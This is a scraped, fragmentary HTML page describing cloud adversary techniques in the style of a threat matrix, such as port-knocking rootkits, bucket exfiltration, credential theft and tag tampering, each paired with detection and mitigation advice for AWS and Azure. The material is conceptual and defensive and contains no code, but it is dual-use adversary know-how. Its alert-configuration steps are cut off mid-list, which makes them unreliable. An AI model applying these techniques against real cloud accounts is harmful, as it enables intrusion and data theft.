<p>Normal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans. Routinely inspect SSH and RDP logs on hosts to detect brute force or other probing attacks.</p>

<p>Description</p>
<p>Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network.</p>
<p>Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.</p>
<p>Cloud virtual networks may contain remote network shares or file storage services accessible to an adversary after they have obtained access to a system. For example, AWS and Azure support creation of Network File System (NFS) shares and Server Message Block (SMB) shares that may be mapped on endpoint or cloud-based systems.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Malicious rootkits on a host in the cloud still require a method of command and control to accomplish adversary objectives. If a compromised cloud host happens to be hosting a public web server or other publicly accessible network service, it is possible to secretly communicate with a rootkit that resides on this host by sending application packets to the service with carefully encoded source ports. In this way the traffic will pass through any firewalls or network security groups which are programmed to let port traffic destined to the service through. Once the packet is delivered to the cloud host, the rootkit can sniff the packet and interpret the source ports as directives.</p>

<p>Detection</p>
<p>Detecting the presence of port-knocking command and control might be possible based on an examination of simple network flow records. In the known exploit, source ports of packets were not increasing monotonically as is the custom from the same IP client. An inspection of flow records from the host would reveal odd behavior as the source ports of packets were jumping around and were both increasing and decreasing by huge amounts in short order.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Adversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated.</p>
<p>If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may “backdoor” user accounts by adding additional permissions or access keys associated with otherwise valid accounts. Adversaries may also retain access through cloud-based infrastructure such as creating their own bastion host within a virtual network.</p>
<p>Use of a<a href="https://attack.mitre.org/techniques/T1100">Web Shell</a>is one such way to maintain access to a network through an externally accessible Web server.</p>

</td>
</tr>
</table>
<p>Detection</p>
<p>Existing methods of detecting remote access tools are helpful. Backup remote access tools or other access points may not have established command and control channels open during an intrusion, so the volume of data transferred may not be as high as the primary channel unless access is lost.</p>
<p>Detection of tools based on beacon traffic, Command and Control protocol, or adversary infrastructure require prior threat intelligence on tools, IP addresses, and/or domains the adversary may use, along with the ability to detect use at the network boundary. Prior knowledge of indicators of compromise may also help detect adversary tools at the endpoint if tools are available to scan for those indicators.</p>
<p>If an intrusion is in progress and sufficient endpoint data or decoded command and control traffic is collected, then defenders will likely be able to detect additional tools dropped as the adversary is conducting the operation.</p>

<p>Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems which may impact system and/or hosted service availability.</p>
<p>One common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive. Servers and cloud-based systems are common targets because of the potential for nearly unlimited resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be easily facilitated using restoration from VM or data storage snapshots through the cloud management dashboard. Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the latter types often reset upon stop/restart of the VM.</p>

<p>Detection</p>
<p>Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to snapshots and rollbacks and VM configuration changes, that are occurring outside of normal activity. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g. tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>By default S3/Blobs are accessible from the public internet if the S3/blob identifier is known and you have the proper credentials. Given this, an adversary with stolen storage credentials can read from existing buckets from anywhere on the Internet and exfiltrate the data stored on them. Malicious actors with more expansive cloud access can stage collected data from other cloud assets within a bucket and then remove contents from the bucket to any external host. They can be also serve out content via HTTPS to allow public consumption of new code.</p>

<p>Although often intended as a temporary solution while working on more challenging aspects of code development, storing code in cloud storage can unintentionally be incorporated into production, leaving consumers of this software vulnerable to code modification when a container or bucket is misconfigured. Adversaries can modify code stored in buckets to implant backdoor software to gain a foothold in what would otherwise be a well-protected enclave. If a storage bucket used for hosting code is ever deleted in the future, adversaries can reclaim the bucket name and without any special privileges stage code for unsuspecting people to invoke. This is especially problematic if web servers are pointing at the repo to fetch some forgotten piece of code.</p>

In terms of IaaS customers Azure storage components such as queues and blobs are encrypted by selecting a check box during creation.

<p><b>Cloud Service Label: IaaS, PaaS, SaaS</b></p>

<p>Description</p>
<p>Adversaries may be able to exploit information that is found exposed online. This type of information could include emails, usernames, passwords, keys, and any information considered sensitive that could be used to facilitate initial or prolonged access. Instances of this could include credentials uploaded to GitHub, information found on a server, or in numerous other places. Adversaries may be able to exploit sensitive information that is exposed. For this reason, configurations should be made to lock down any and all sensitive information and be vigilant when uploading information to publicly accessible resources. This can lead to initial access, privilege escalation, discovery, and collection.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Both Azure and AWS employ authentication/authorization accounts that enable user access paradigms to be applied to cloud applications and resources. In Azure these “service principals” are called Managed Identities and can be assigned to VM’s and other Azure resources rather than embedding access credentials elsewhere within the resource that could be stolen. These service principals can be leveraged by any one with local command privileges to access cloud resources that the service principal object may have rights to.</p>
<p>In Azure, Automation accounts are required to automate admin tasks and are automatically assigned contributor privileges to the subscription. Contributor access on the subscription inherently gives you contributor rights on all of the virtual machines in a subscription which in turn grants you SYSTEM on Windows and root on Linux VMs.</p>

<p><b>Cloud Service Label: IaaS</b></p>

<p>Description</p>
<p>Adversaries may steal the credentials of cloud administrators using well-known endpoint credential harvesting techniques. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available cloud services, such as cloud storage services. Compromised credentials may also grant an adversary increased privilege to specific cloud systems or resources.</p>
<p>It is common for adversaries to utilize stolen private keys, to legitimately connect to remote IaaS environments via<a href="https://attack.mitre.org/techniques/T1021">Remote Services</a>. AWS routinely assigns remote keys to every new VM created. These keys are usually downloaded and stored on the local box of the user who is performing the VM creation task. A local exploit of this user’s workstation now also compromises access to whatever VM’s this user has created.</p>
<p>Local web browsers of cloud admin console users cache access tokens that enable quick reconnection if a browser window is accidentally closed. However these tokens may also be stolen from local machines to grant cloud console access to adversaries who have a presence on the local workstation of that user.</p>
<p>The overlap of local workstation access, credentials, and permissions across a network of local workstations and Cloud systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., user plane to control plane) to bypass access controls set within the enterprise.</p>

Rather use accounts that have been delegated admin access to certain resources. In Azure for example, using an account with the owner role at the subscription level for every day tasks is a risky proposition.

These accounts can be used with their pre-defined settings, or modified depending on specific use cases. These can limit access to basic functionality needed. This is outlined at:<b>https://support.google.com/a/answer/2405986?hl=en.</b></p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>AWS and Azure allow cloud users to tag resources with arbitrary labels ostensibly for accounting and management purposes. It is often a good practice to use this tagging information in detection engines and in making automated security decisions. If an adversary is able to discern the tagging protocol, he can alter tags for newly created services to potentially avoid detection or to circumvent security mitigations.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>An adversary may exfiltrate data by transferring the data, including backups or snapshots of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.</p>
<p>A defender who is monitoring for large transfers external to the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider or even to another VPC illicitly created within the same account. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.</p>
<p>Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.</p>

<p><b>Cloud Service Label: IaaS ,PaaS, SaaS</b></p>

<p>Description</p>
<p>Adversaries may breach or otherwise leverage organizations and systems that have access to targeted cloud assets. Access through a trusted relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network. These connections include on-premise assets and logically separate cloud assets that afford special access to a customer’s cloud resources. Organizations often grant elevated access to on-premise systems and third party external providers including SaaS providers in order to allow them to manage cloud assets or share information. Some examples of these relationships include IT services contractors, managed security providers, and infrastructure contractors. Azure permits the creation of guest accounts to allow external organizations to access certain resources. These accounts probably will not be automatically culled from the system if the user leaves the guest organization as would likely happen in the host organization. This could result in accesses being permitted for unauthorized persons.</p>

</td>
<td valign="top" width="395"><p>As pointed out in a research paper written by the University of California San Diego and the Massachusetts Institute of Technology, co-residence is the process of identifying cloud instances that share the same underlying physical infrastructure, despite being separated virtually. Cloud users trust the cloud provider to ensure separation between different customers, however it is possible for a motivated customer to theoretically ensure co-residence with another customer on the same physical cloud host. Once virtual machine co-residence has been established, it might be possible to infer keys or other access credentials from co-resident machines leveraging their shared cache.</p>

<p><b>Cloud Service Label: IaaS</b></p>

<p>Description</p>
<p>Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure. Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.</p>
<p>A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity. For example, AWS GuardDuty is not supported in every region. An example of adversary use of unused AWS regions is to mine cryptocurrency through<a href="https://attack.mitre.org/techniques/T1496">Resource Hijacking</a>, which can cost organizations substantial amounts of money over time depending on the processing power used.</p>

<p>Credentials for accessing Azure and AWS portals/API are often reused for other web-based accounts by both privileged Azure and AWS users.

<p><b>Cloud Service Label: IaaS</b></p>

<p>Description</p>
<p>Adversaries that have established a presence in one virtual network (VPC in AWS) will attempt to explore and access resources in other virtual networks owned by the same organization. By default, individual virtual networks have no routable paths between each other, so it is difficult to access one from another. Both Azure and AWS offer peering capabilities that enable virtual networks to communicate with each other seamlessly. Once peered, routing between the virtual networks is configured in the background and all resources in one virtual network are now reachable by default by the other.</p>

<p><b>Cloud Service Label: IaaS, PaaS, SaaS</b></p>

<p>Description</p>
<p>Adversaries may be able to exploit weak passwords to gain initial access. When user accounts utilize weak, or reused passwords, it runs the risk of adversaries gaining access, once access is gained, they can continue on in their attack. The adversary may have the ability to change user credentials locking the user out, collect data, maintain persistence, escalate privileges, and move laterally. The level of access, and ability for adversary to complete these tasks, is dependent on the permissions the user of the exploited password holds.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Many customer cloud deployments incorporate a public web server to serve external entities with content. Adversaries that have gained access to a customer’s cloud assets and have already located and collected data for exfiltration can use such web servers as a stealthy way of exfiltrating data. An adversary knows that cloud firewalls and monitoring products are configured to expect and allow data to be served by public web servers. There are public exfiltration tools that make public web servers in a cloud especially convenient for an adversary to utilize for exfiltration.</p>

</div></body></html>Exfiltrating Using Web Servers (version 1.0) Cloud Service Label:  IaaS, PaaS Description Many customer cloud deployments incorporate a public web server to
serve external entities with content.  Adversaries that have gained access to a
customers cloud assets and have already located and collected data for
exfiltration can use such web servers as a stealthy way of exfiltrating data. 
An adversary knows that cloud firewalls and monitoring products are configured
to expect and allow data to be served by public web servers.  There are public
exfiltration tools that make public web servers in a cloud especially
convenient for an adversary to utilize for exfiltration. Examples Name Description PyExfil Publicly
  available tool set to leverage web servers and other adversary controlled
  assets to stealthily exfiltrate data from compromised accounts. Mitigations Mitigation Description Audit Frequently
  check permissions on cloud storage to ensure proper permissions are set to
  deny open or unprivileged access to resources. Consider using automated
  resource checkers such as CloudSploit or Divvycloud. Frequently check accesses to web servers for content that has not been
  downloaded before. AWS To
  perform an audit via AWS it is suggested to review information such as
  account details (credentials, users, groups, roles, etc), mobile
  applications, EC2 configurations, policies, and account activity. How to
  audit these different factors can be found in detail at: https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html. Azure To
  perform an audit via Azure an administrator can review the audit logs that
  are recorded under Azures monitoring for active directory. The audit logs
  allow for filtering, as well as looking at users, groups, and enterprise
  specific information. Full details on how to access this information can be
  found at: https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs. GCP To
  perform an audit via GCP the logs can be reviewed. GCP breaks this down into
  three categories; admin activity, data access, and system events. The audit
  logs can be viewed a few different ways- the console, API, or gcloud. Full
  details on how to view these logs, how to export, and for how to configure
  the retention period can be found here: https://cloud.google.com/logging/docs/audit. Task
  Definition Edit Privileges If it is necessary to have a task definition run a role that
  requires an elevated level of permission, ensure that that task definition
  cannot be altered by everyone. Detection Detection Description Create Log Metric
  Filters and Alarms for AWS To create a
  metric filter and alarm: 1. Create a
  metric filter that checks for IAM policy changes and the <cloudtrail_log_group_name> 2. Create an
  SNS topic 3. Create an
  SNS subscription to the above topic 4. Create an
  alarm associated with the filter and SNS topic created in steps 1 and 2
  respectively Monitor Activity
  in AWS Account Various services
  in AWS offer logging features that allow for detection capabilities. These
  include CloudFront, CloudTrail, CloudWatch, Config, and S3. Monitor for
  Suspicious Activity in Azure Azure AD can
  generate anomaly reports than can be run on a daily basis. Azure AD Identity
  Protection show current risks in its dashboard and provides daily email
  summary notifications. Policies can also be configured to alert to specific
  issues. Create Log Metric
  Filters and Alarms for CloudTrail To create a
  metric filter and alarm: 1. Create a
  filter that checks for CloudTrail changes and the specific <cloudtrail_log_group_name> 2. Create an
  SNS topic that the alarm will notify 3. Create an
  SNS subscription to the above topic 4. Create an
  alarm associated with the filter from step 1 and SNS topic in step 2 Create Activity
  Log Alerts in Azure To create log
  activity alerts for deletion in the Azure Console: 1. Navigate
  to Monitor / Alerts 2. Select Manage
  alert rules 3. Click on
  the Alert Name where Condition contains operationName equals
  Microsoft.Network/networkSecurityGroups/securityRules/delete 4. Hover a
  mouse over Condition to ensure it is set to Whenever the

  alert rule of the Alerts window 3. Provide
  information in Define alert condition 4. Provide
  details in Define alert details 5. Specify
  action group for new alert rule under Action group , or create a new
  action group with + New group 6. Select Yes for the Enable rule upon creation option 7. Select Create
  alert rule To view and
  manage alerts: 1. Select Monitor
  -> Alerts -> Manage alert rules 2. Select the
  rule you want to modify and double-click to edit the rule options 3. Click Save Azure Resource
  Manager Templates Azure Resource
  Manager templates in the format of JSON files that can be used to configure
  metric alerts in Azure Monitor. These templates can be used for simple static
  and dynamic threshold metric alerts, availability tests, and monitoring
  multiple resources. Enable CloudTrail
  across all regions in AWS To enable
  CloudTrail across all regions: 1. Sign into
  the AWS Management Console and open the CloudTrail console 2. Click on Trails 3. Set
  necessary Trails to All option in the I column 4. Click on a

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Both Azure and AWS employ security services that enable the inclusion of IP addresses that should be permitted through firewalls or should be ignored by services such as AWS Guard Duty. An adversary can add a simple IP address rule that likely will be missed by security personnel and will effectively negate the effectiveness of future security controls.</p>
